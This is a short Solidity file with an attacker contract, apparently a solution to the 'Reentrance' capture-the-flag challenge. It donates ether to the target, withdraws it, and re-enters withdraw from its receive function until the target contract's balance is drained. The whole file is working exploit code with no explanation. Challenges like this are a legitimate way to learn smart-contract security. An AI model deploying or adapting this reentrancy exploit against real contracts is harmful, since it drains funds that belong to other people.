// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentranceChallenge  {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttacker { 
  IReentranceChallenge challenge;

  constructor(address reentranceAddress) {
    challenge = IReentranceChallenge(reentranceAddress);
  }

  function attack() public payable {
    challenge.donate{value: msg.value}(address(this));
    challenge.withdraw(msg.value);
  }  

  receive() external payable {
    if(address(challenge).balance >= msg.value) {
      challenge.withdraw(msg.value);
    } else {
      challenge.withdraw(address(challenge).balance);
    }
  }
}